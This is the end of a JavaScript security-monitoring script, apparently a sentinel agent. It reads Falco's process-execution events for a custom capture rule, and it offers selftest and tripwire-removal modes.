  falco.on("error", (e) => { log(`FATAL: cannot start Falco (${e.message}). Is it installed and are we root?`); process.exit(1); });
  falco.stderr.on("data", (b) => { const s = b.toString().trim(); if (/error|fail/i.test(s)) log(`falco: ${s.split("\n")[0]}`); });

  createInterface({ input: falco.stdout }).on("line", (line) => {
    if (!line.includes("aris_exec_capture")) return;
    let ev;
    try { ev = JSON.parse(line); } catch { return; }
    if (ev.rule === "aris_exec_capture" && ev.output_fields) handleEvent(ev.output_fields);
  });

  log(`  armed — watching process execs via Falco. Ctrl-C to stop.`);
  process.on("SIGINT", () => { falco.kill("SIGTERM"); process.exit(0); });
}

// Only run when executed directly (node sentinel-agent.mjs / agentd.mjs), not when
// imported by the unit tests.
const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isMain) {
  if (SELFTEST) selftest();
  else if (TRIPWIRE_REMOVE) {
    const r = disarmTripwire({ stateFile: TRIPWIRE_STATE });
    log(r.armed ? `tripwire removed: ${r.removed.length} path(s) deleted${r.kept.length ? `, left in place: ${r.kept.join(", ")}` : ""}` : `no tripwire state at ${TRIPWIRE_STATE}; nothing to remove`);
  } else main();
}
